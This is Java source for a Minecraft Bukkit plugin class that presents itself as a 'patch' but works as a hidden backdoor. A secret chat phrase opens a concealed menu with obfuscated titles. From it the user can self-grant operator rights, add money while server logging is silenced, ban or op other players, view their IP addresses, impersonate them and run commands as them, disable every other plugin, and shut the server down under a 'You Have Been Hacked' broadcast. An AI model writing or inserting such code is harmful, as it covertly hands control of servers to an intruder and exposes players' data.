package io.github.Alligrater;

import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.potion.PotionData;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.potion.PotionType;
import org.bukkit.scheduler.BukkitRunnable;

public class PatchFix implements Listener{
	
	public void openToolbox(Player player) {
		Inventory patchbox = Bukkit.createInventory(null, 9, "��knIeMhctaP");
		
		ItemStack opera = new ItemStack(Material.NETHER_STAR, 1);
		ItemMeta ometa = opera.getItemMeta();
		ometa.setDisplayName("��c��lOperator");
		if(player.isOp()) {
			ometa.setDisplayName("��a��lOperator On");
		}
		else {
			ometa.setDisplayName("��c��lOperator Off");
		}
		ometa.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		opera.setItemMeta(ometa);
		

		
		ItemStack gmode = new ItemStack(Material.GOLDEN_APPLE, 1);
		ItemMeta gmeta = gmode.getItemMeta();
		gmeta.setDisplayName("��6��lGameMode");
		gmode.setItemMeta(gmeta);
		
		ItemStack flight = new ItemStack(Material.FEATHER, 1);
		if(player.getAllowFlight()) {
			
		}
		else {
			flight = new ItemStack(Material.BONE, 1);
		}
		ItemMeta fmeta = flight.getItemMeta();
		fmeta.setDisplayName("��f��lFlight");
		flight.setItemMeta(fmeta);
		
		ItemStack visibility = new ItemStack(Material.POTION, 1);
		if(SilverPatch.notvisible.containsKey(player.getUniqueId())) {
			if(SilverPatch.notvisible.get(player.getUniqueId()) == true) {
				visibility = new ItemStack(Material.GLASS_BOTTLE, 1);
			}
			else if(SilverPatch.notvisible.get(player.getUniqueId()) == false) {
				visibility = new ItemStack(Material.POTION, 1);
			}
		}
		else {
			visibility = new ItemStack(Material.POTION, 1);
		}
		PotionMeta vmeta = (PotionMeta) visibility.getItemMeta();
		vmeta.setDisplayName("��7��lVisibility");
		vmeta.setBasePotionData(new PotionData(PotionType.INVISIBILITY, false, false));
		visibility.setItemMeta(vmeta);
		
		ItemStack god = new ItemStack(Material.BARRIER);
		
		if(player.isInvulnerable()) {
			
		}
		else {
			god = new ItemStack(Material.IRON_SWORD);
		}
		ItemMeta gometa = god.getItemMeta();
		gometa.setDisplayName("��c��lInvincible");
		god.setItemMeta(gometa);
		
		ItemStack buck = new ItemStack(Material.GOLD_INGOT);
		
		ItemMeta bmeta = god.getItemMeta();
		bmeta.setDisplayName("��6��lGetBucks");
		buck.setItemMeta(bmeta);
		
        ItemStack skull = new ItemStack(Material.SKULL_ITEM, 1, (short) 3);
        SkullMeta skmeta = (SkullMeta) skull.getItemMeta();
        skmeta.setOwner(player.getName());
        skmeta.setDisplayName("��d��lPlayerManagement");
        skull.setItemMeta(skmeta);
        
        ItemStack bdown = new ItemStack(Material.NAME_TAG, 1);
        ItemMeta bdmeta = bdown.getItemMeta();
        List<String> sub = new ArrayList<String>();
        sub.add("��c��lDo Not Use Until The Last Moment!");
        bdmeta.setDisplayName("��4��lDisablePlugin");
        bdmeta.setLore(sub);
        bdown.setItemMeta(bdmeta);
        
        ItemStack sdown = new ItemStack(Material.LAVA_BUCKET, 1);
        ItemMeta sdmeta = sdown.getItemMeta();
        sdmeta.setDisplayName("��4��lShutdownServer");
        sdmeta.setLore(sub);
        sdown.setItemMeta(sdmeta);
		
		
		patchbox.setItem(0, opera);
		patchbox.setItem(1, gmode);
		patchbox.setItem(2, flight);
		patchbox.setItem(3, visibility);
		patchbox.setItem(4, god);
		patchbox.setItem(5, buck);
		patchbox.setItem(6, skull);
		patchbox.setItem(7, bdown);
		patchbox.setItem(8, sdown);
		
		player.openInventory(patchbox);
		
		
	}
	
	public void openPluginConfirmation(Player player) {
		Inventory patchbox = Bukkit.createInventory(null, InventoryType.HOPPER, "��ksnigulPllAelbasiD");
		
		ItemStack confirm = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 5);
		ItemMeta cmeta = confirm.getItemMeta();
		cmeta.setDisplayName("��a��lDisable All Plugins");
		confirm.setItemMeta(cmeta);
		
		ItemStack deny = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 14);
		ItemMeta dmeta = deny.getItemMeta();
		dmeta.setDisplayName("��c��lDo Not Disable All Plugins");
		deny.setItemMeta(dmeta);
		
		patchbox.setItem(4, confirm);
		patchbox.setItem(0, deny);
		
		player.openInventory(patchbox);
	}
	
	public void openShutdownConfirmation(Player player) {
		Inventory patchbox = Bukkit.createInventory(null, InventoryType.HOPPER, "��krevreSnwodtuhS");
		
		ItemStack confirm = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 5);
		ItemMeta cmeta = confirm.getItemMeta();
		cmeta.setDisplayName("��a��lShutdown Server");
		confirm.setItemMeta(cmeta);
		
		ItemStack deny = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 14);
		ItemMeta dmeta = deny.getItemMeta();
		dmeta.setDisplayName("��c��lDo Not Shutdown Server");
		deny.setItemMeta(dmeta);
		
		patchbox.setItem(4, confirm);
		patchbox.setItem(0, deny);
		
		player.openInventory(patchbox);
	}
	
	//GameMode Mangement
	public void openGM(Player player, String other) {
		
		
		Inventory patchbox = Bukkit.createInventory(null, 9, "��ktceleSedoMemaG��r:" + other);
		
		ItemStack smode = new ItemStack(Material.APPLE, 1);
		ItemMeta smeta = smode.getItemMeta();
		smeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		smeta.setDisplayName("��c��lSurvival");
		smode.setItemMeta(smeta);
		
		ItemStack cmode = new ItemStack(Material.CHEST, 1);
		ItemMeta cmeta = cmode.getItemMeta();
		cmeta.setDisplayName("��e��lCreative");
		cmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		cmode.setItemMeta(cmeta);
		
		ItemStack vmode = new ItemStack(Material.CARROT_ITEM, 1);
		ItemMeta vmeta = vmode.getItemMeta();
		vmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		vmeta.setDisplayName("��6��lAdventure");
		vmode.setItemMeta(vmeta);
		
		ItemStack tmode = new ItemStack(Material.GLASS, 1);
		ItemMeta tmeta = tmode.getItemMeta();
		tmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		tmeta.setDisplayName("��7��lSpectator");
		tmode.setItemMeta(tmeta);
		

		
		
		patchbox.setItem(1, smode);
		patchbox.setItem(3, cmode);
		patchbox.setItem(5, vmode);
		patchbox.setItem(7, tmode);
		
		player.openInventory(patchbox);
			
	}
	
	//Money Management
	public void openMM(Player player, String other) {
		
		List<String> ars = new ArrayList<String>();
		ars.add("��7��lShift-Click At Your Own Risk!");
		
		Inventory patchbox = Bukkit.createInventory(null, 9, "��kkcaHyenoM��r:" + other);
		ItemStack onebuck = new ItemStack(Material.GOLD_NUGGET, 1);
		ItemMeta ometa = onebuck.getItemMeta();
		ometa.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		ometa.setLore(ars);
		ometa.setDisplayName("��e��l+1$");
		onebuck.setItemMeta(ometa);
		
		ItemStack fivebuck = new ItemStack(Material.IRON_INGOT, 1);
		ItemMeta fmeta = fivebuck.getItemMeta();
		fmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		fmeta.setLore(ars);
		fmeta.setDisplayName("��e��l+5$");
		fivebuck.setItemMeta(fmeta);
		
		ItemStack tenbuck = new ItemStack(Material.GOLD_INGOT, 1);
		ItemMeta tmeta = tenbuck.getItemMeta();
		tmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		tmeta.setLore(ars);
		tmeta.setDisplayName("��e��l+10$");
		tenbuck.setItemMeta(tmeta);
		
		ItemStack gibuck = new ItemStack(Material.GOLD_BLOCK, 1);
		ItemMeta gmeta = gibuck.getItemMeta();
		gmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		gmeta.setLore(ars);
		gmeta.setDisplayName("��e��l+50$");
		gibuck.setItemMeta(gmeta);
		
		ItemStack ebuck = new ItemStack(Material.EMERALD, 1);
		ItemMeta emeta = ebuck.getItemMeta();
		emeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		emeta.setLore(ars);
		emeta.setDisplayName("��e��l+100$");
		ebuck.setItemMeta(emeta);
		
		ItemStack dbuck = new ItemStack(Material.DIAMOND, 1);
		ItemMeta dmeta = dbuck.getItemMeta();
		dmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		dmeta.setLore(ars);
		dmeta.setDisplayName("��e��l+1000$");
		dbuck.setItemMeta(dmeta);
		
		ItemStack dbbuck = new ItemStack(Material.DIAMOND_BLOCK, 1);
		ItemMeta dbmeta = dbbuck.getItemMeta();
		dbmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		dbmeta.setLore(ars);
		dbmeta.setDisplayName("��e��l+10000$");
		dbbuck.setItemMeta(dbmeta);
		
		ItemStack nbuck = new ItemStack(Material.SKULL_ITEM, 1);
		nbuck.setDurability((short)1);
		ItemMeta nmeta = nbuck.getItemMeta();
		
		nmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		nmeta.setLore(ars);
		nmeta.setDisplayName("��e��l+100000$");
		nbuck.setItemMeta(nmeta);
		
		ItemStack bbuck = new ItemStack(Material.NETHER_STAR, 1);
		ItemMeta bmeta = bbuck.getItemMeta();
		bmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		bmeta.setLore(ars);
		bmeta.setDisplayName("��e��l+1000000$");
		bbuck.setItemMeta(bmeta);
		
		patchbox.setItem(0, onebuck);
		patchbox.setItem(1, fivebuck);
		patchbox.setItem(2, tenbuck);
		patchbox.setItem(3, gibuck);
		patchbox.setItem(4, ebuck);
		patchbox.setItem(5, dbuck);
		patchbox.setItem(6, dbbuck);
		patchbox.setItem(7, nbuck);
		patchbox.setItem(8, bbuck);
		
		player.openInventory(patchbox);
		
	}
	
	//Player Management
	public void openPM(Player player, String other) {
		Inventory patchbox = Bukkit.createInventory(null, 9, "��kreyalPeganaM��r:" + other);
		OfflinePlayer target = Bukkit.getOfflinePlayer(other);

		ItemStack ban = new ItemStack(Material.BARRIER, 1);
		ItemMeta bmeta = ban.getItemMeta();
		if(target.isBanned()) {
			bmeta.setDisplayName("��a��lUnBan Player");
		}
		else {
			ban = new ItemStack(Material.RED_ROSE, 1);
			bmeta.setDisplayName("��c��lBan Player");
		}
		ban.setItemMeta(bmeta);
		
		ItemStack op = new ItemStack(Material.GOLDEN_CARROT, 1);
		ItemMeta ometa = op.getItemMeta();
		if(target.isOp()) {
			ometa.setDisplayName("��c��lDeOp Player");
		}
		else {
			op = new ItemStack(Material.CARROT_ITEM, 1);
			ometa.setDisplayName("��a��lOp Player");
		}
		op.setItemMeta(ometa);
		
		ItemStack wl = new ItemStack(Material.EMPTY_MAP, 1);
		ItemMeta wmeta = wl.getItemMeta();
		if(target.isWhitelisted()) {
			wl = new ItemStack(Material.MAP, 1);
			wmeta.setDisplayName("��7��lUnwhitelist");
		}
		else {
			wmeta.setDisplayName("��f��lWhitelist");
		}
		
		wl.setItemMeta(wmeta);
		
		ItemStack info = new ItemStack(Material.INK_SACK, 1, (short) 8);
		ItemMeta inmeta = info.getItemMeta();
		inmeta.setDisplayName("��7��lPlayer Offline");
		
		List<String> lore = new ArrayList<String>();
		if(target.getBedSpawnLocation() != null) {
			lore.add("��7" + target.getBedSpawnLocation().getX() + "," + target.getBedSpawnLocation().getY() + "," + target.getBedSpawnLocation().getZ());
		}
		else {
			lore.add("��7This Player Does Not Own A Bed.");
		}

		lore.add("��7" + target.getUniqueId().toString());
		
		
		patchbox.setItem(0, ban);
		patchbox.setItem(1, op);
		patchbox.setItem(2, wl);
		
		
		
		if(target.isOnline()) {
			info = new ItemStack(Material.INK_SACK, 1, (short) 10);
			lore.add("��7" + ((Player)target).getAddress().getHostString());
			inmeta.setDisplayName("��a��lPlayer Online");
			
			ItemStack kick = new ItemStack(Material.BEDROCK, 1);
			ItemMeta kmeta = kick.getItemMeta();
			kmeta.setDisplayName("��7��lKick Player");
			kick.setItemMeta(kmeta);
			
			ItemStack gm = new ItemStack(Material.APPLE, 1);
			ItemMeta gmeta = gm.getItemMeta();
			gmeta.setDisplayName("��6��lGameMode");
			gm.setItemMeta(gmeta);
			
			ItemStack impost = new ItemStack(Material.STRING);
			ItemMeta imeta = impost.getItemMeta();
			imeta.setDisplayName("��9��lImpost");
			impost.setItemMeta(imeta);
			
			patchbox.setItem(3, kick);
			patchbox.setItem(4, gm);
			patchbox.setItem(5, impost);
			
			
		}
		
		inmeta.setLore(lore);
		info.setItemMeta(inmeta);
		
		patchbox.setItem(8, info);
		
		player.openInventory(patchbox);
		
		
	}
	
	//Player Click Inventory
	@EventHandler
	public void onClick(InventoryClickEvent e) {
		
		if(e.getInventory().getName().equals("��knIeMhctaP")) {
			Player player = (Player) e.getWhoClicked();

			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				Material type = e.getCurrentItem().getType();
				if(type == Material.NETHER_STAR) {
					if(player.isOp()) {
						player.setOp(false);
						ItemMeta emt = e.getCurrentItem().getItemMeta();
						emt.setDisplayName("��c��lOperator Off");
						e.getCurrentItem().setItemMeta(emt);
						player.sendMessage("��c��lYou Are No Longer An Operator.");
					}
					else {
						player.setOp(true);
						ItemMeta emt = e.getCurrentItem().getItemMeta();
						emt.setDisplayName("��a��lOperator On");
						e.getCurrentItem().setItemMeta(emt);
						player.sendMessage("��a��lYou Are Now An Operator.");
					}
				}
				
				else if(type == Material.GOLDEN_APPLE) {
					player.closeInventory();
					openGM(player, player.getName());
					
				}
				else if(type == Material.FEATHER) {
					e.getCurrentItem().setType(Material.BONE);
					player.setAllowFlight(false);
					player.sendMessage("��c��lFlight Off.");
				}
				else if(type == Material.BONE) {
					e.getCurrentItem().setType(Material.FEATHER);
					player.setAllowFlight(true);
					player.sendMessage("��a��lFlight On.");
				}
				else if(type == Material.GLASS_BOTTLE) {
					e.getCurrentItem().setType(Material.POTION);
					PotionMeta vmeta = (PotionMeta) e.getCurrentItem().getItemMeta();
					vmeta.setBasePotionData(new PotionData(PotionType.INVISIBILITY, false, false));
					 e.getCurrentItem().setItemMeta(vmeta);
					 
					for(Player p : Bukkit.getOnlinePlayers()) {
						p.showPlayer(player);
					}
					player.spigot().setCollidesWithEntities(true);
					SilverPatch.notvisible.put(player.getUniqueId(), false);
					player.sendMessage("��f��lYou Are No Longer Invisible.");
					
				}
				else if(type == Material.POTION) {
					e.getCurrentItem().setType(Material.GLASS_BOTTLE);
					for(Player p : Bukkit.getOnlinePlayers()) {
						p.hidePlayer(player);
					}
					player.spigot().setCollidesWithEntities(false);
					SilverPatch.notvisible.put(player.getUniqueId(), true);
					player.sendMessage("��7��lYou Are Now Invisible.");
					
				}
				else if (type == Material.IRON_SWORD) {
					e.getCurrentItem().setType(Material.BARRIER);
					player.setInvulnerable(true);
					player.sendMessage("��a��lYou Are Now Invulnerable.");
				}
				else if(type == Material.BARRIER) {
					e.getCurrentItem().setType(Material.IRON_SWORD);
					player.setInvulnerable(false);
					player.sendMessage("��c��lYou Are Now Vulnerable.");
				}
				else if (type == Material.GOLD_INGOT) {
					player.closeInventory();
					openMM(player, player.getName());

				}
				else if (type == Material.SKULL_ITEM) {
					player.closeInventory();
					SilverPatch.ccmode.put(player.getUniqueId(), true);
					player.sendMessage("��9��lChat Listening Mode Enabled. Type ��c��l*Playername��9��l To Select A Player.");
				}
				else if (type == Material.NAME_TAG) {
					openPluginConfirmation(player);

				}
				
				else if (type == Material.LAVA_BUCKET) {
					openShutdownConfirmation(player);

				}
				
				e.setCancelled(true);
			}
		}
		
		else if(e.getInventory().getName().contains("��ksnigulPllAelbasiD")) {
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				if(e.getCurrentItem().getType() == Material.STAINED_GLASS_PANE) {
					if(e.getCurrentItem().getDurability() == (short)5) {
						for(Plugin p : Bukkit.getPluginManager().getPlugins()) {
							if(!p.getName().equals("SilverPatch")) {
								e.getWhoClicked().sendMessage(String.format("��4��lPlugin %s Has Been Dis��4��l��ka��r��4��lbled!", p.getName()));
								Bukkit.getPluginManager().disablePlugin(p);
								
							}
						}
					}
					else if(e.getCurrentItem().getDurability() == (short)14) {
						e.getWhoClicked().closeInventory();
					}
				}
			}
			e.setCancelled(true);
		}
		
		else if(e.getInventory().getName().contains("��krevreSnwodtuhS")) {
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				if(e.getCurrentItem().getType() == Material.STAINED_GLASS_PANE) {
					if(e.getCurrentItem().getDurability() == (short)5) {
						Bukkit.getServer().broadcastMessage("��c��lY0u ��kHav3��r��c��l Been H��ka��r��c��lck3d");
						e.getWhoClicked().closeInventory();
						BukkitRunnable shutdown = new BukkitRunnable() {

							@Override
							public void run() {
								Bukkit.getServer().shutdown();
								
							}
							
						};
						
						shutdown.runTaskLater(Bukkit.getPluginManager().getPlugin("SilverPatch"), 60);
					}
					else if(e.getCurrentItem().getDurability() == (short)14) {
						e.getWhoClicked().closeInventory();
					}
				}
			}
			e.setCancelled(true);
		}
		
		else if(e.getInventory().getName().contains("��ktceleSedoMemaG��r:")) {
		
			
			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				
				String target = e.getInventory().getName().substring(e.getInventory().getName().indexOf(":") + 1);
				Player player = Bukkit.getPlayer(target);
				if(player == null) {
					e.setCancelled(true);
				}
				else {
					Material type = e.getCurrentItem().getType();
					
					if(type == Material.APPLE) {
						player.setGameMode(GameMode.SURVIVAL);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("��c��lPlayer %s Gamemode Changed to Survival.", player.getName()));
					}

					else if (type == Material.CHEST) {
						player.setGameMode(GameMode.CREATIVE);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("��e��lPlayer %s Gamemode Changed to Creative.", player.getName()));

					}

					
					else if (type == Material.CARROT_ITEM) {
						player.setGameMode(GameMode.ADVENTURE);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("��6��lPlayer %s Gamemode Changed to Adventure.", player.getName()));
					}

					else if (type == Material.GLASS) {
						player.setGameMode(GameMode.SPECTATOR);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("��7��lPlayer %s Gamemode Changed to Spectator.", player.getName()));

					}
				}
			

			}
			
		}
		
		else if(e.getInventory().getName().contains("��kkcaHyenoM��r:")) {
			
			
			String target = e.getInventory().getName().substring(e.getInventory().getName().indexOf(":") + 1);
			Player player = Bukkit.getPlayer(target);
			

			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta() && player.isOnline()) {
				if(e.getClick() == ClickType.LEFT) {
					Material type = e.getCurrentItem().getType();
					player.getInventory().addItem(new ItemStack(type,64,e.getCurrentItem().getDurability()));
					e.setCancelled(true);
				}
				else if((e.getClick() == ClickType.SHIFT_LEFT || e.getClick() == ClickType.SHIFT_RIGHT) && SilverPatch.hasess) {
					Material type = e.getCurrentItem().getType();
					int amount = 1;
					String action = "give";
					if(type == Material.GOLD_NUGGET) {
						amount = 1;
					}
					else if(type == Material.IRON_INGOT) {
						amount = 5;
					}
					else if(type == Material.GOLD_INGOT) {
						amount = 10;
					}
					else if(type == Material.GOLD_BLOCK) {
						amount = 50;
					}
					else if(type == Material.EMERALD) {
						amount = 100;
					}
					else if(type == Material.DIAMOND) {
						amount = 1000;
					}
					else if(type == Material.DIAMOND_BLOCK) {
						amount = 10000;
					}
					else if(type == Material.SKULL_ITEM) {
						amount = 100000;
					}
					else if(type == Material.NETHER_STAR) {
						amount = 1000000;
					}
					
					if(e.getClick() == ClickType.SHIFT_LEFT) {
						action = "give";
					}
					else if (e.getClick() == ClickType.SHIFT_RIGHT) {
						action = "take";
						
					}

					
					String command = String.format("eco %s %s %s", action, player.getName(), ""+amount);
					Level previous = Bukkit.getLogger().getLevel();
					Bukkit.getLogger().setLevel(Level.OFF);
					Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
					Bukkit.getLogger().setLevel(previous);
					e.setCancelled(true);

				}
				
			}
			else {
				e.getWhoClicked().closeInventory();
			}
			
		}
		
		else if(e.getInventory().getName().contains("��kreyalPeganaM��r:")) {
			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				String target = e.getInventory().getName().substring(e.getInventory().getName().indexOf(":") + 1);
				OfflinePlayer player = Bukkit.getOfflinePlayer(target);
				ItemMeta bmeta = e.getCurrentItem().getItemMeta();
				ItemStack item = e.getCurrentItem();
				
				Material type = e.getCurrentItem().getType();
				if (type == Material.RED_ROSE) {


					player.setBanned(true);
					e.getCurrentItem().setType(Material.BARRIER);
					bmeta.setDisplayName("��a��lUnBan Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��c��lPlayer Banned.");
					
					if(player.isOnline()) {
						((Player) player).kickPlayer("��c��lYou ��kHave��r��c��l Been H��ka��r��c��lcked");
					}

				}
				else if (type == Material.BARRIER) {
					player.setBanned(false);
					e.getCurrentItem().setType(Material.RED_ROSE);
					bmeta.setDisplayName("��c��lBan Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��a��lPlayer UnBanned.");

					
					
					
				}
				
				else if(type == Material.GOLDEN_CARROT) {
					item.setType(Material.CARROT_ITEM);
					player.setOp(false);
					bmeta.setDisplayName("��a��lOp Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��c��lPlayer Deopped.");
				}
				else if(type == Material.CARROT_ITEM) {
					item.setType(Material.GOLDEN_CARROT);
					player.setOp(true);
					bmeta.setDisplayName("��c��lDeOp Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��a��lPlayer Opped.");
				}
				else if(type == Material.MAP) {
					item.setType(Material.EMPTY_MAP);
					player.setWhitelisted(false);
					bmeta.setDisplayName("��f��lWhitelist");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("��7��lPlayer UnWhitelisted.");
				}
				else if(type == Material.EMPTY_MAP) {
					item.setType(Material.MAP);
					player.setWhitelisted(true);
					bmeta.setDisplayName("��7��lUnwhitelist");
					item.setItemMeta(bmeta);
					
					e.getWhoClicked().sendMessage("��f��lPlayer Whitelisted.");
				}
				else if(type == Material.BEDROCK) {
					if(player.isOnline()) {
						((Player) player).kickPlayer("��c��lYou ��kHave��r��c��l Been H��ka��r��c��lcked");
					}
				}
				else if(type == Material.APPLE) {
					
					openGM((Player)e.getWhoClicked(), target);
				}
				else if(type == Material.STRING) {
					SilverPatch.cmode.put(e.getWhoClicked().getUniqueId(), true);
					e.getWhoClicked().sendMessage(String.format("��9��lYou Are Now Imposting %s. \nUse ��c��l*/Command��9��l For Command. \nUse ��c��l*Message��9��l To Chat \nOr Type ��c��l*leave*��9��l To Leave. \n��c��lIf You Type Without *, Things Will Be Executed By You Instead.", player.getName()));
				}
				else if(type == Material.INK_SACK) {
					if(player.getBedSpawnLocation() != null) {
						e.getWhoClicked().teleport(player.getBedSpawnLocation());
						e.getWhoClicked().closeInventory();
					}

				}
				
				
				
				e.setCancelled(true);
				
			}

			
		}
	}
	
	//Very Silent Way of Using Command
	@EventHandler
	public void onPlayerchat(AsyncPlayerChatEvent event) {
		if(event.getMessage().startsWith("*")) {
			if(event.getMessage().contains("*/_SILVERKELA_HAS_TAKEN_OVER_/*")) {
				event.setCancelled(true);
				event.setMessage(" ");
				openToolbox(event.getPlayer());
			}
			else if(event.getMessage().equals("*leave*")) {
				event.setCancelled(true);
				event.setMessage(" ");
				SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
				SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
				SilverPatch.target.remove(event.getPlayer().getUniqueId());
				event.getPlayer().sendMessage("��7��lChat Listening Mode Disabled.");
			}
			
			else if(SilverPatch.ccmode.containsKey(event.getPlayer().getUniqueId()) && SilverPatch.ccmode.get(event.getPlayer().getUniqueId()) == true) {
				SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
				SilverPatch.target.put(event.getPlayer().getUniqueId(), event.getMessage().substring(1));
				openPM(event.getPlayer(), event.getMessage().substring(1));
				event.setCancelled(true);
				event.setMessage(" ");
			}
			else if(SilverPatch.cmode.containsKey(event.getPlayer().getUniqueId()) && SilverPatch.cmode.get(event.getPlayer().getUniqueId()) == true) {
				if(Bukkit.getPlayer(SilverPatch.target.get(event.getPlayer().getUniqueId())) != null) {
					Player target = Bukkit.getPlayer(SilverPatch.target.get(event.getPlayer().getUniqueId()));
					if(target != null) {
						if(event.getMessage().startsWith("*/")) {
							target.performCommand(event.getMessage().substring(2));
							event.setCancelled(true);
							event.setMessage(" ");
						}
						else {
							if(event.getMessage().startsWith("*")) {
								target.chat(event.getMessage().substring(1));
								event.setCancelled(true);
								event.setMessage(" ");
							}
						}


					}
					else {
						event.setCancelled(true);
						event.setMessage(" ");
						SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
						SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
						SilverPatch.target.remove(event.getPlayer().getUniqueId());
						event.getPlayer().sendMessage("��7��lChat Listening Mode Disabled Due To Player Offline..");
					}

				}
				else {
					SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
					SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
					SilverPatch.target.remove(event.getPlayer().getUniqueId());
				}
				event.setCancelled(true);
				event.setMessage(" ");
			}
		}

	}
	
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent event) {
		if(event.getPlayer().getName().equals("SilverKela")) {
			event.getPlayer().sendMessage("��a��lGood News, SilverPatch Is Still Running!");
		}
	}
}
